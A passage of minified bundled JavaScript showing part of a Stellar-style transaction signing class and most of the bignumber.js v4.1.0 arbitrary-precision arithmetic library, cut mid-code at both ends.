                for (var V = this, K = this.hash(), Q = arguments.length, ee = Array(Q), ae = 0; ae < Q; ae++)
                    ee[ae] = arguments[ae];
                ee.forEach(function(ne) {
                    var oe = ne.signDecorated(K);
                    V.signatures.push(oe)
                })
            }
        }, {
            key: "getKeypairSignature",
            value: function(V) {
                return V.sign(this.hash()).toString("base64")
            }
        }, {
            key: "addSignature",
            value: function() {
                var V = arguments.length > 0 && arguments[0] !== void 0 ? arguments[0] : ""
                  , K = arguments.length > 1 && arguments[1] !== void 0 ? arguments[1] : "";
                if (!K || typeof K != "string")
                    throw new Error("Invalid signature");
                if (!V || typeof V != "string")
                    throw new Error("Invalid publicKey");
                var Q = void 0
                  , ee = void 0
                  , ae = Buffer.from(K, "base64");
                try {
                    Q = w.Keypair.fromPublicKey(V),
                    ee = Q.signatureHint()
                } catch {
                    throw new Error("Invalid publicKey")
                }
                if (!Q.verify(this.hash(), ae))
                    throw new Error("Invalid signature");
                this.signatures.push(new O.default.DecoratedSignature({
                    hint: ee,
                    signature: ae
                }))
            }
        }, {
            key: "signHashX",
            value: function(V) {
                if (typeof V == "string" && (V = Buffer.from(V, "hex")),
                V.length > 64)
                    throw new Error("preimage cannnot be longer than 64 bytes");
                var K = V
                  , Q = (0,
                x.hash)(V)
                  , ee = Q.slice(Q.length - 4);
                this.signatures.push(new O.default.DecoratedSignature({
                    hint: ee,
                    signature: K
                }))
            }
        }, {
            key: "hash",
            value: function() {
                return (0,
                x.hash)(this.signatureBase())
            }
        }, {
            key: "signatureBase",
            value: function() {
                throw new Error("Implement in subclass")
            }
        }, {
            key: "toEnvelope",
            value: function() {
                throw new Error("Implement in subclass")
            }
        }, {
            key: "toXDR",
            value: function() {
                return this.toEnvelope().toXDR().toString("base64")
            }
        }, {
            key: "signatures",
            get: function() {
                return this._signatures
            },
            set: function(V) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "tx",
            get: function() {
                return this._tx
            },
            set: function(V) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "fee",
            get: function() {
                return this._fee
            },
            set: function(V) {
                throw new Error("Transaction is immutable")
            }
        }, {
            key: "networkPassphrase",
            get: function() {
                return this._networkPassphrase
            },
            set: function(V) {
                this._networkPassphrase = V
            }
        }]),
        Y
    }(),
    transaction_base$1
}
var transaction$1 = {}
  , operation$1 = {}
  , bignumber$4 = {
    exports: {}
};
/*! bignumber.js v4.1.0 https://github.com/MikeMcl/bignumber.js/LICENCE */
var bignumber$3 = bignumber$4.exports, hasRequiredBignumber$2;
function requireBignumber$2() {
    return hasRequiredBignumber$2 || (hasRequiredBignumber$2 = 1,
    function(_) {
        (function(M) {
            var j, O = /^-?(\d+(\.\d*)?|\.\d+)(e[+-]?\d+)?$/i, x = Math.ceil, w = Math.floor, b = " not a boolean or binary digit", X = "rounding mode", Y = "number type has more than 15 significant digits", F = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ$_", V = 1e14, K = 14, Q = 9007199254740991, ee = [1, 10, 100, 1e3, 1e4, 1e5, 1e6, 1e7, 1e8, 1e9, 1e10, 1e11, 1e12, 1e13], ae = 1e7, ne = 1e9;
            function oe(Be) {
                var ce, q, L = 0, U = Le.prototype, Z = new Le(1), te = 20, se = 4, de = -7, re = 21, $ = -1e7, ie = 1e7, ve = !0, ge = qe, Re = !1, Pe = 1, Ie = 0, Te = {
                    decimalSeparator: ".",
                    groupSeparator: ",",
                    groupSize: 3,
                    secondaryGroupSize: 0,
                    fractionGroupSeparator: "",
                    fractionGroupSize: 0
                };
                function Le(je, Ke) {
                    var Qe, We, mt, ct, vt, we, _e = this;
                    if (!(_e instanceof Le))
                        return ve && lt(26, "constructor call without new", je),
                        new Le(je,Ke);
                    if (Ke == null || !ge(Ke, 2, 64, L, "base")) {
                        if (je instanceof Le) {
                            _e.s = je.s,
                            _e.e = je.e,
                            _e.c = (je = je.c) ? je.slice() : je,
                            L = 0;
                            return
                        }
                        if ((ct = typeof je == "number") && je * 0 == 0) {
                            if (_e.s = 1 / je < 0 ? (je = -je,
                            -1) : 1,
                            je === ~~je) {
                                for (We = 0,
                                mt = je; mt >= 10; mt /= 10,
                                We++)
                                    ;
                                _e.e = We,
                                _e.c = [je],
                                L = 0;
                                return
                            }
                            we = je + ""
                        } else {
                            if (!O.test(we = je + ""))
                                return q(_e, we, ct);
                            _e.s = we.charCodeAt(0) === 45 ? (we = we.slice(1),
                            -1) : 1
                        }
                    } else {
                        if (Ke = Ke | 0,
                        we = je + "",
                        Ke == 10)
                            return _e = new Le(je instanceof Le ? je : we),
                            nt(_e, te + _e.e + 1, se);
                        if ((ct = typeof je == "number") && je * 0 != 0 || !new RegExp("^-?" + (Qe = "[" + F.slice(0, Ke) + "]+") + "(?:\\." + Qe + ")?$",Ke < 37 ? "i" : "").test(we))
                            return q(_e, we, ct, Ke);
                        ct ? (_e.s = 1 / je < 0 ? (we = we.slice(1),
                        -1) : 1,
                        ve && we.replace(/^0\.0*|\./, "").length > 15 && lt(L, Y, je),
                        ct = !1) : _e.s = we.charCodeAt(0) === 45 ? (we = we.slice(1),
                        -1) : 1,
                        we = Ze(we, 10, Ke, _e.s)
                    }
                    for ((We = we.indexOf(".")) > -1 && (we = we.replace(".", "")),
                    (mt = we.search(/e/i)) > 0 ? (We < 0 && (We = mt),
                    We += +we.slice(mt + 1),
                    we = we.substring(0, mt)) : We < 0 && (We = we.length),
                    mt = 0; we.charCodeAt(mt) === 48; mt++)
                        ;
                    for (vt = we.length; we.charCodeAt(--vt) === 48; )
                        ;
                    if (we = we.slice(mt, vt + 1),
                    we)
                        if (vt = we.length,
                        ct && ve && vt > 15 && (je > Q || je !== w(je)) && lt(L, Y, _e.s * je),
                        We = We - mt - 1,
                        We > ie)
                            _e.c = _e.e = null;
                        else if (We < $)
                            _e.c = [_e.e = 0];
                        else {
                            if (_e.e = We,
                            _e.c = [],
                            mt = (We + 1) % K,
                            We < 0 && (mt += K),
                            mt < vt) {
                                for (mt && _e.c.push(+we.slice(0, mt)),
                                vt -= K; mt < vt; )
                                    _e.c.push(+we.slice(mt, mt += K));
                                we = we.slice(mt),
                                mt = K - we.length
                            } else
                                mt -= vt;
                            for (; mt--; we += "0")
                                ;
                            _e.c.push(+we)
                        }
                    else
                        _e.c = [_e.e = 0];
                    L = 0
                }
                Le.another = oe,
                Le.ROUND_UP = 0,
                Le.ROUND_DOWN = 1,
                Le.ROUND_CEIL = 2,
                Le.ROUND_FLOOR = 3,
                Le.ROUND_HALF_UP = 4,
                Le.ROUND_HALF_DOWN = 5,
                Le.ROUND_HALF_EVEN = 6,
                Le.ROUND_HALF_CEIL = 7,
                Le.ROUND_HALF_FLOOR = 8,
                Le.EUCLID = 9,
                Le.config = Le.set = function() {
                    var je, Ke, Qe = 0, We = {}, mt = arguments, ct = mt[0], vt = ct && typeof ct == "object" ? function() {
                        if (ct.hasOwnProperty(Ke))
                            return (je = ct[Ke]) != null
                    }
                    : function() {
                        if (mt.length > Qe)
                            return (je = mt[Qe++]) != null
                    }
                    ;
                    return vt(Ke = "DECIMAL_PLACES") && ge(je, 0, ne, 2, Ke) && (te = je | 0),
                    We[Ke] = te,
                    vt(Ke = "ROUNDING_MODE") && ge(je, 0, 8, 2, Ke) && (se = je | 0),
                    We[Ke] = se,
                    vt(Ke = "EXPONENTIAL_AT") && (ye(je) ? ge(je[0], -1e9, 0, 2, Ke) && ge(je[1], 0, ne, 2, Ke) && (de = je[0] | 0,
                    re = je[1] | 0) : ge(je, -1e9, ne, 2, Ke) && (de = -(re = (je < 0 ? -je : je) | 0))),
                    We[Ke] = [de, re],
                    vt(Ke = "RANGE") && (ye(je) ? ge(je[0], -1e9, -1, 2, Ke) && ge(je[1], 1, ne, 2, Ke) && ($ = je[0] | 0,
                    ie = je[1] | 0) : ge(je, -1e9, ne, 2, Ke) && (je | 0 ? $ = -(ie = (je < 0 ? -je : je) | 0) : ve && lt(2, Ke + " cannot be zero", je))),
                    We[Ke] = [$, ie],
                    vt(Ke = "ERRORS") && (je === !!je || je === 1 || je === 0 ? (L = 0,
                    ge = (ve = !!je) ? qe : pe) : ve && lt(2, Ke + b, je)),
                    We[Ke] = ve,
                    vt(Ke = "CRYPTO") && (je === !0 || je === !1 || je === 1 || je === 0 ? je ? (je = typeof crypto > "u",
                    !je && crypto && (crypto.getRandomValues || crypto.randomBytes) ? Re = !0 : ve ? lt(2, "crypto unavailable", je ? void 0 : crypto) : Re = !1) : Re = !1 : ve && lt(2, Ke + b, je)),
                    We[Ke] = Re,
                    vt(Ke = "MODULO_MODE") && ge(je, 0, 9, 2, Ke) && (Pe = je | 0),
                    We[Ke] = Pe,
                    vt(Ke = "POW_PRECISION") && ge(je, 0, ne, 2, Ke) && (Ie = je | 0),
                    We[Ke] = Ie,
                    vt(Ke = "FORMAT") && (typeof je == "object" ? Te = je : ve && lt(2, Ke + " not an object", je)),
                    We[Ke] = Te,
                    We
                }
                ,
                Le.max = function() {
                    return Ne(arguments, U.lt)
                }
                ,
                Le.min = function() {
                    return Ne(arguments, U.gt)
                }
                ,
                Le.random = function() {
                    var je = 9007199254740992
                      , Ke = Math.random() * je & 2097151 ? function() {
                        return w(Math.random() * je)
                    }
                    : function() {
                        return (Math.random() * 1073741824 | 0) * 8388608 + (Math.random() * 8388608 | 0)
                    }
                    ;
                    return function(Qe) {
                        var We, mt, ct, vt, we, _e = 0, Ce = [], st = new Le(Z);
                        if (Qe = Qe == null || !ge(Qe, 0, ne, 14) ? te : Qe | 0,
                        vt = x(Qe / K),
                        Re)
                            if (crypto.getRandomValues) {
                                for (We = crypto.getRandomValues(new Uint32Array(vt *= 2)); _e < vt; )
                                    we = We[_e] * 131072 + (We[_e + 1] >>> 11),
                                    we >= 9e15 ? (mt = crypto.getRandomValues(new Uint32Array(2)),
                                    We[_e] = mt[0],
                                    We[_e + 1] = mt[1]) : (Ce.push(we % 1e14),
                                    _e += 2);
                                _e = vt / 2
                            } else if (crypto.randomBytes) {
                                for (We = crypto.randomBytes(vt *= 7); _e < vt; )
                                    we = (We[_e] & 31) * 281474976710656 + We[_e + 1] * 1099511627776 + We[_e + 2] * 4294967296 + We[_e + 3] * 16777216 + (We[_e + 4] << 16) + (We[_e + 5] << 8) + We[_e + 6],
                                    we >= 9e15 ? crypto.randomBytes(7).copy(We, _e) : (Ce.push(we % 1e14),
                                    _e += 7);
                                _e = vt / 7
                            } else
                                Re = !1,
                                ve && lt(14, "crypto unavailable", crypto);
                        if (!Re)
                            for (; _e < vt; )
                                we = Ke(),
                                we < 9e15 && (Ce[_e++] = we % 1e14);
                        for (vt = Ce[--_e],
                        Qe %= K,
                        vt && Qe && (we = ee[K - Qe],
                        Ce[_e] = w(vt / we) * we); Ce[_e] === 0; Ce.pop(),
                        _e--)
                            ;
                        if (_e < 0)
                            Ce = [ct = 0];
                        else {
                            for (ct = -1; Ce[0] === 0; Ce.splice(0, 1),
                            ct -= K)
                                ;
                            for (_e = 1,
                            we = Ce[0]; we >= 10; we /= 10,
                            _e++)
                                ;
                            _e < K && (ct -= K - _e)
                        }
                        return st.e = ct,
                        st.c = Ce,
                        st
                    }
                }();
                function Ze(je, Ke, Qe, We) {
                    var mt, ct, vt, we, _e, Ce, st, et = je.indexOf("."), tt = te, He = se;
                    for (Qe < 37 && (je = je.toLowerCase()),
                    et >= 0 && (vt = Ie,
                    Ie = 0,
                    je = je.replace(".", ""),
                    st = new Le(Qe),
                    _e = st.pow(je.length - et),
                    Ie = vt,
                    st.c = be(Ae(fe(_e.c), _e.e), 10, Ke),
                    st.e = st.c.length),
                    Ce = be(je, Qe, Ke),
                    ct = vt = Ce.length; Ce[--vt] == 0; Ce.pop())
                        ;
                    if (!Ce[0])
                        return "0";
                    if (et < 0 ? --ct : (_e.c = Ce,
                    _e.e = ct,
                    _e.s = We,
                    _e = ce(_e, st, tt, He, Ke),
                    Ce = _e.c,
                    we = _e.r,
                    ct = _e.e),
                    mt = ct + tt + 1,
                    et = Ce[mt],
                    vt = Ke / 2,
                    we = we || mt < 0 || Ce[mt + 1] != null,
                    we = He < 4 ? (et != null || we) && (He == 0 || He == (_e.s < 0 ? 3 : 2)) : et > vt || et == vt && (He == 4 || we || He == 6 && Ce[mt - 1] & 1 || He == (_e.s < 0 ? 8 : 7)),
                    mt < 1 || !Ce[0])
                        je = we ? Ae("1", -tt) : "0";
                    else {
                        if (Ce.length = mt,
                        we)
                            for (--Ke; ++Ce[--mt] > Ke; )
                                Ce[mt] = 0,
                                mt || (++ct,
                                Ce = [1].concat(Ce));
                        for (vt = Ce.length; !Ce[--vt]; )
                            ;
                        for (et = 0,
                        je = ""; et <= vt; je += F.charAt(Ce[et++]))
                            ;
                        je = Ae(je, ct)
                    }
                    return je
                }
                ce = function() {
                    function je(We, mt, ct) {
                        var vt, we, _e, Ce, st = 0, et = We.length, tt = mt % ae, He = mt / ae | 0;
                        for (We = We.slice(); et--; )
                            _e = We[et] % ae,
                            Ce = We[et] / ae | 0,
                            vt = He * _e + Ce * tt,
                            we = tt * _e + vt % ae * ae + st,
                            st = (we / ct | 0) + (vt / ae | 0) + He * Ce,
                            We[et] = we % ct;
                        return st && (We = [st].concat(We)),
                        We
                    }
                    function Ke(We, mt, ct, vt) {
                        var we, _e;
                        if (ct != vt)
                            _e = ct > vt ? 1 : -1;
                        else
                            for (we = _e = 0; we < ct; we++)
                                if (We[we] != mt[we]) {
                                    _e = We[we] > mt[we] ? 1 : -1;
                                    break
                                }
                        return _e
                    }
                    function Qe(We, mt, ct, vt) {
                        for (var we = 0; ct--; )
                            We[ct] -= we,
                            we = We[ct] < mt[ct] ? 1 : 0,
                            We[ct] = we * vt + We[ct] - mt[ct];
                        for (; !We[0] && We.length > 1; We.splice(0, 1))
                            ;
                    }
                    return function(We, mt, ct, vt, we) {
                        var _e, Ce, st, et, tt, He, ke, Me, Ue, rt, dt, Et, ft, gt, Yt, Ct, Ot, Vt = We.s == mt.s ? 1 : -1, Pt = We.c, Bt = mt.c;
                        if (!Pt || !Pt[0] || !Bt || !Bt[0])
                            return new Le(!We.s || !mt.s || (Pt ? Bt && Pt[0] == Bt[0] : !Bt) ? NaN : Pt && Pt[0] == 0 || !Bt ? Vt * 0 : Vt / 0);
                        for (Me = new Le(Vt),
                        Ue = Me.c = [],
                        Ce = We.e - mt.e,
                        Vt = ct + Ce + 1,
                        we || (we = V,
                        Ce = ue(We.e / K) - ue(mt.e / K),
                        Vt = Vt / K | 0),
                        st = 0; Bt[st] == (Pt[st] || 0); st++)
                            ;
                        if (Bt[st] > (Pt[st] || 0) && Ce--,
                        Vt < 0)
                            Ue.push(1),
                            et = !0;
                        else {
                            for (gt = Pt.length,
                            Ct = Bt.length,
                            st = 0,
                            Vt += 2,
                            tt = w(we / (Bt[0] + 1)),
                            tt > 1 && (Bt = je(Bt, tt, we),
                            Pt = je(Pt, tt, we),
                            Ct = Bt.length,
                            gt = Pt.length),
                            ft = Ct,
                            rt = Pt.slice(0, Ct),
                            dt = rt.length; dt < Ct; rt[dt++] = 0)
                                ;
                            Ot = Bt.slice(),
                            Ot = [0].concat(Ot),
                            Yt = Bt[0],
                            Bt[1] >= we / 2 && Yt++;
                            do {
                                if (tt = 0,
                                _e = Ke(Bt, rt, Ct, dt),
                                _e < 0) {
                                    if (Et = rt[0],
                                    Ct != dt && (Et = Et * we + (rt[1] || 0)),
                                    tt = w(Et / Yt),
                                    tt > 1)
                                        for (tt >= we && (tt = we - 1),
                                        He = je(Bt, tt, we),
                                        ke = He.length,
                                        dt = rt.length; Ke(He, rt, ke, dt) == 1; )
                                            tt--,
                                            Qe(He, Ct < ke ? Ot : Bt, ke, we),
                                            ke = He.length,
                                            _e = 1;
                                    else
                                        tt == 0 && (_e = tt = 1),
                                        He = Bt.slice(),
                                        ke = He.length;
                                    if (ke < dt && (He = [0].concat(He)),
                                    Qe(rt, He, dt, we),
                                    dt = rt.length,
                                    _e == -1)
                                        for (; Ke(Bt, rt, Ct, dt) < 1; )
                                            tt++,
                                            Qe(rt, Ct < dt ? Ot : Bt, dt, we),
                                            dt = rt.length
                                } else
                                    _e === 0 && (tt++,
                                    rt = [0]);
                                Ue[st++] = tt,
                                rt[0] ? rt[dt++] = Pt[ft] || 0 : (rt = [Pt[ft]],
                                dt = 1)
                            } while ((ft++ < gt || rt[0] != null) && Vt--);
                            et = rt[0] != null,
                            Ue[0] || Ue.splice(0, 1)
                        }
                        if (we == V) {
                            for (st = 1,
                            Vt = Ue[0]; Vt >= 10; Vt /= 10,
                            st++)
                                ;
                            nt(Me, ct + (Me.e = st + Ce * K - 1) + 1, vt, et)
                        } else
                            Me.e = Ce,
                            Me.r = +et;
                        return Me
                    }
                }();
                function $e(je, Ke, Qe, We) {
                    var mt, ct, vt, we, _e;
                    if (Qe = Qe != null && ge(Qe, 0, 8, We, X) ? Qe | 0 : se,
                    !je.c)
                        return je.toString();
                    if (mt = je.c[0],
                    vt = je.e,
                    Ke == null)
                        _e = fe(je.c),
                        _e = We == 19 || We == 24 && vt <= de ? xe(_e, vt) : Ae(_e, vt);
                    else if (je = nt(new Le(je), Ke, Qe),
                    ct = je.e,
                    _e = fe(je.c),
                    we = _e.length,
                    We == 19 || We == 24 && (Ke <= ct || ct <= de)) {
                        for (; we < Ke; _e += "0",
                        we++)
                            ;
                        _e = xe(_e, ct)
                    } else if (Ke -= vt,
                    _e = Ae(_e, ct),
                    ct + 1 > we) {
                        if (--Ke > 0)
                            for (_e += "."; Ke--; _e += "0")
                                ;
                    } else if (Ke += ct - we,
                    Ke > 0)
                        for (ct + 1 == we && (_e += "."); Ke--; _e += "0")
                            ;
                    return je.s < 0 && mt ? "-" + _e : _e
                }
                function Ne(je, Ke) {
                    var Qe, We, mt = 0;
                    for (ye(je[0]) && (je = je[0]),
                    Qe = new Le(je[0]); ++mt < je.length; )
                        if (We = new Le(je[mt]),
                        We.s)
                            Ke.call(Qe, We) && (Qe = We);
                        else {
                            Qe = We;
                            break
                        }
                    return Qe
                }
                function qe(je, Ke, Qe, We, mt) {
                    return (je < Ke || je > Qe || je != Ee(je)) && lt(We, (mt || "decimal places") + (je < Ke || je > Qe ? " out of range" : " not an integer"), je),
                    !0
                }
                function Ve(je, Ke, Qe) {
                    for (var We = 1, mt = Ke.length; !Ke[--mt]; Ke.pop())
                        ;
                    for (mt = Ke[0]; mt >= 10; mt /= 10,
                    We++)
                        ;
                    return (Qe = We + Qe * K - 1) > ie ? je.c = je.e = null : Qe < $ ? je.c = [je.e = 0] : (je.e = Qe,
                    je.c = Ke),
                    je
                }
                q = function() {
                    var je = /^(-?)0([xbo])(?=\w[\w.]*$)/i
                      , Ke = /^([^.]+)\.$/
                      , Qe = /^\.([^.]+)$/
                      , We = /^-?(Infinity|NaN)$/
                      , mt = /^\s*\+(?=[\w.])|^\s+|\s+$/g;
                    return function(ct, vt, we, _e) {
                        var Ce, st = we ? vt : vt.replace(mt, "");
                        if (We.test(st))
                            ct.s = isNaN(st) ? null : st < 0 ? -1 : 1;
                        else {
                            if (!we && (st = st.replace(je, function(et, tt, He) {
                                return Ce = (He = He.toLowerCase()) == "x" ? 16 : He == "b" ? 2 : 8,
                                !_e || _e == Ce ? tt : et
                            }),
                            _e && (Ce = _e,
                            st = st.replace(Ke, "$1").replace(Qe, "0.$1")),
                            vt != st))
                                return new Le(st,Ce);
                            ve && lt(L, "not a" + (_e ? " base " + _e : "") + " number", vt),
                            ct.s = null
                        }
                        ct.c = ct.e = null,
                        L = 0
                    }
                }();
                function lt(je, Ke, Qe) {
                    var We = new Error(["new BigNumber", "cmp", "config", "div", "divToInt", "eq", "gt", "gte", "lt", "lte", "minus", "mod", "plus", "precision", "random", "round", "shift", "times", "toDigits", "toExponential", "toFixed", "toFormat", "toFraction", "pow", "toPrecision", "toString", "BigNumber"][je] + "() " + Ke + ": " + Qe);
                    throw We.name = "BigNumber Error",
                    L = 0,
                    We
                }
                function nt(je, Ke, Qe, We) {
                    var mt, ct, vt, we, _e, Ce, st, et = je.c, tt = ee;
                    if (et) {
                        e: {
                            for (mt = 1,
                            we = et[0]; we >= 10; we /= 10,
                            mt++)
                                ;
                            if (ct = Ke - mt,
                            ct < 0)
                                ct += K,
                                vt = Ke,
                                _e = et[Ce = 0],
                                st = _e / tt[mt - vt - 1] % 10 | 0;
                            else if (Ce = x((ct + 1) / K),
                            Ce >= et.length)
                                if (We) {
                                    for (; et.length <= Ce; et.push(0))
                                        ;
                                    _e = st = 0,
                                    mt = 1,
                                    ct %= K,
                                    vt = ct - K + 1
                                } else
                                    break e;
                            else {
                                for (_e = we = et[Ce],
                                mt = 1; we >= 10; we /= 10,
                                mt++)
                                    ;
                                ct %= K,
                                vt = ct - K + mt,
                                st = vt < 0 ? 0 : _e / tt[mt - vt - 1] % 10 | 0
                            }
                            if (We = We || Ke < 0 || et[Ce + 1] != null || (vt < 0 ? _e : _e % tt[mt - vt - 1]),
                            We = Qe < 4 ? (st || We) && (Qe == 0 || Qe == (je.s < 0 ? 3 : 2)) : st > 5 || st == 5 && (Qe == 4 || We || Qe == 6 && (ct > 0 ? vt > 0 ? _e / tt[mt - vt] : 0 : et[Ce - 1]) % 10 & 1 || Qe == (je.s < 0 ? 8 : 7)),
                            Ke < 1 || !et[0])
                                return et.length = 0,
                                We ? (Ke -= je.e + 1,
                                et[0] = tt[(K - Ke % K) % K],
                                je.e = -Ke || 0) : et[0] = je.e = 0,
                                je;
                            if (ct == 0 ? (et.length = Ce,
                            we = 1,
                            Ce--) : (et.length = Ce + 1,
                            we = tt[K - ct],
                            et[Ce] = vt > 0 ? w(_e / tt[mt - vt] % tt[vt]) * we : 0),
                            We)
                                for (; ; )
                                    if (Ce == 0) {
                                        for (ct = 1,
                                        vt = et[0]; vt >= 10; vt /= 10,
                                        ct++)
                                            ;
                                        for (vt = et[0] += we,
                                        we = 1; vt >= 10; vt /= 10,
                                        we++)
                                            ;
                                        ct != we && (je.e++,
                                        et[0] == V && (et[0] = 1));
                                        break
                                    } else {
                                        if (et[Ce] += we,
                                        et[Ce] != V)
                                            break;
                                        et[Ce--] = 0,
                                        we = 1
                                    }
                            for (ct = et.length; et[--ct] === 0; et.pop())
                                ;
                        }
                        je.e > ie ? je.c = je.e = null : je.e < $ && (je.c = [je.e = 0])
                    }
                    return je
                }
                return U.absoluteValue = U.abs = function() {
                    var je = new Le(this);
                    return je.s < 0 && (je.s = 1),
                    je
                }
                ,
                U.ceil = function() {
                    return nt(new Le(this), this.e + 1, 2)
                }
                ,
                U.comparedTo = U.cmp = function(je, Ke) {
                    return L = 1,
                    he(this, new Le(je,Ke))
                }
                ,
                U.decimalPlaces = U.dp = function() {
                    var je, Ke, Qe = this.c;
                    if (!Qe)
                        return null;
                    if (je = ((Ke = Qe.length - 1) - ue(this.e / K)) * K,
                    Ke = Qe[Ke])
                        for (; Ke % 10 == 0; Ke /= 10,
                        je--)
                            ;
                    return je < 0 && (je = 0),
                    je
                }
                ,
                U.dividedBy = U.div = function(je, Ke) {
                    return L = 3,
                    ce(this, new Le(je,Ke), te, se)
                }
                ,
                U.dividedToIntegerBy = U.divToInt = function(je, Ke) {
                    return L = 4,
                    ce(this, new Le(je,Ke), 0, 1)
                }
                ,
                U.equals = U.eq = function(je, Ke) {
                    return L = 5,
                    he(this, new Le(je,Ke)) === 0
                }
                ,
                U.floor = function() {
                    return nt(new Le(this), this.e + 1, 3)
                }
                ,
                U.greaterThan = U.gt = function(je, Ke) {
                    return L = 6,
                    he(this, new Le(je,Ke)) > 0
                }
                ,
                U.greaterThanOrEqualTo = U.gte = function(je, Ke) {
                    return L = 7,
                    (Ke = he(this, new Le(je,Ke))) === 1 || Ke === 0
                }
                ,
                U.isFinite = function() {
                    return !!this.c
                }
                ,
                U.isInteger = U.isInt = function() {
                    return !!this.c && ue(this.e / K) > this.c.length - 2
                }
                ,
                U.isNaN = function() {
                    return !this.s
                }
                ,
                U.isNegative = U.isNeg = function() {
                    return this.s < 0
                }
                ,
                U.isZero = function() {
                    return !!this.c && this.c[0] == 0
                }
                ,
                U.lessThan = U.lt = function(je, Ke) {
                    return L = 8,
                    he(this, new Le(je,Ke)) < 0
                }
                ,
                U.lessThanOrEqualTo = U.lte = function(je, Ke) {
                    return L = 9,
                    (Ke = he(this, new Le(je,Ke))) === -1 || Ke === 0
                }
                ,
                U.minus = U.sub = function(je, Ke) {
                    var Qe, We, mt, ct, vt = this, we = vt.s;
                    if (L = 10,
                    je = new Le(je,Ke),
                    Ke = je.s,
                    !we || !Ke)
                        return new Le(NaN);
                    if (we != Ke)
                        return je.s = -Ke,
                        vt.plus(je);
                    var _e = vt.e / K
                      , Ce = je.e / K
                      , st = vt.c
                      , et = je.c;
                    if (!_e || !Ce) {
                        if (!st || !et)
                            return st ? (je.s = -Ke,
                            je) : new Le(et ? vt : NaN);
                        if (!st[0] || !et[0])
                            return et[0] ? (je.s = -Ke,
                            je) : new Le(st[0] ? vt : se == 3 ? -0 : 0)
                    }
                    if (_e = ue(_e),
                    Ce = ue(Ce),
                    st = st.slice(),
                    we = _e - Ce) {
                        for ((ct = we < 0) ? (we = -we,
                        mt = st) : (Ce = _e,
                        mt = et),
                        mt.reverse(),
                        Ke = we; Ke--; mt.push(0))
                            ;
                        mt.reverse()
                    } else
                        for (We = (ct = (we = st.length) < (Ke = et.length)) ? we : Ke,
                        we = Ke = 0; Ke < We; Ke++)
                            if (st[Ke] != et[Ke]) {
                                ct = st[Ke] < et[Ke];
                                break
                            }
                    if (ct && (mt = st,
                    st = et,
                    et = mt,
                    je.s = -je.s),
                    Ke = (We = et.length) - (Qe = st.length),
                    Ke > 0)
                        for (; Ke--; st[Qe++] = 0)
                            ;
                    for (Ke = V - 1; We > we; ) {
                        if (st[--We] < et[We]) {
                            for (Qe = We; Qe && !st[--Qe]; st[Qe] = Ke)
                                ;
                            --st[Qe],
                            st[We] += V
                        }
                        st[We] -= et[We]
                    }
                    for (; st[0] == 0; st.splice(0, 1),
                    --Ce)
                        ;
                    return st[0] ? Ve(je, st, Ce) : (je.s = se == 3 ? -1 : 1,
                    je.c = [je.e = 0],
                    je)
                }
                ,
                U.modulo = U.mod = function(je, Ke) {
                    var Qe, We, mt = this;
                    return L = 11,
                    je = new Le(je,Ke),
                    !mt.c || !je.s || je.c && !je.c[0] ? new Le(NaN) : !je.c || mt.c && !mt.c[0] ? new Le(mt) : (Pe == 9 ? (We = je.s,
                    je.s = 1,
                    Qe = ce(mt, je, 0, 3),
                    je.s = We,
                    Qe.s *= We) : Qe = ce(mt, je, 0, Pe),
                    mt.minus(Qe.times(je)))
                }
                ,
                U.negated = U.neg = function() {
                    var je = new Le(this);
                    return je.s = -je.s || null,
                    je
                }
                ,
                U.plus = U.add = function(je, Ke) {
                    var Qe, We = this, mt = We.s;
                    if (L = 12,
                    je = new Le(je,Ke),
                    Ke = je.s,
                    !mt || !Ke)
                        return new Le(NaN);
                    if (mt != Ke)
                        return je.s = -Ke,
                        We.minus(je);
                    var ct = We.e / K
                      , vt = je.e / K
                      , we = We.c
                      , _e = je.c;
                    if (!ct || !vt) {
                        if (!we || !_e)
                            return new Le(mt / 0);
                        if (!we[0] || !_e[0])
                            return _e[0] ? je : new Le(we[0] ? We : mt * 0)
                    }
                    if (ct = ue(ct),
                    vt = ue(vt),
                    we = we.slice(),
                    mt = ct - vt) {
                        for (mt > 0 ? (vt = ct,
                        Qe = _e) : (mt = -mt,
                        Qe = we),
                        Qe.reverse(); mt--; Qe.push(0))
                            ;
                        Qe.reverse()
                    }
                    for (mt = we.length,
                    Ke = _e.length,
                    mt - Ke < 0 && (Qe = _e,
                    _e = we,
                    we = Qe,
                    Ke = mt),
                    mt = 0; Ke; )
                        mt = (we[--Ke] = we[Ke] + _e[Ke] + mt) / V | 0,
                        we[Ke] = V === we[Ke] ? 0 : we[Ke] % V;
                    return mt && (we = [mt].concat(we),
                    ++vt),
                    Ve(je, we, vt)
                }
                ,
                U.precision = U.sd = function(je) {
                    var Ke, Qe, We = this, mt = We.c;
                    if (je != null && je !== !!je && je !== 1 && je !== 0 && (ve && lt(13, "argument" + b, je),
                    je != !!je && (je = null)),
                    !mt)
                        return null;
                    if (Qe = mt.length - 1,
                    Ke = Qe * K + 1,
                    Qe = mt[Qe]) {
                        for (; Qe % 10 == 0; Qe /= 10,
                        Ke--)
                            ;
                        for (Qe = mt[0]; Qe >= 10; Qe /= 10,
                        Ke++)
                            ;
                    }
                    return je && We.e + 1 > Ke && (Ke = We.e + 1),
                    Ke
                }
                ,
                U.round = function(je, Ke) {
                    var Qe = new Le(this);
                    return (je == null || ge(je, 0, ne, 15)) && nt(Qe, ~~je + this.e + 1, Ke == null || !ge(Ke, 0, 8, 15, X) ? se : Ke | 0),
                    Qe
                }
                ,
                U.shift = function(je) {
                    var Ke = this;
                    return ge(je, -9007199254740991, Q, 16, "argument") ? Ke.times("1e" + Ee(je)) : new Le(Ke.c && Ke.c[0] && (je < -9007199254740991 || je > Q) ? Ke.s * (je < 0 ? 0 : 1 / 0) : Ke)
                }
                ,
                U.squareRoot = U.sqrt = function() {
                    var je, Ke, Qe, We, mt, ct = this, vt = ct.c, we = ct.s, _e = ct.e, Ce = te + 4, st = new Le("0.5");
                    if (we !== 1 || !vt || !vt[0])
                        return new Le(!we || we < 0 && (!vt || vt[0]) ? NaN : vt ? ct : 1 / 0);
                    if (we = Math.sqrt(+ct),
                    we == 0 || we == 1 / 0 ? (Ke = fe(vt),
                    (Ke.length + _e) % 2 == 0 && (Ke += "0"),
                    we = Math.sqrt(Ke),
                    _e = ue((_e + 1) / 2) - (_e < 0 || _e % 2),
                    we == 1 / 0 ? Ke = "1e" + _e : (Ke = we.toExponential(),
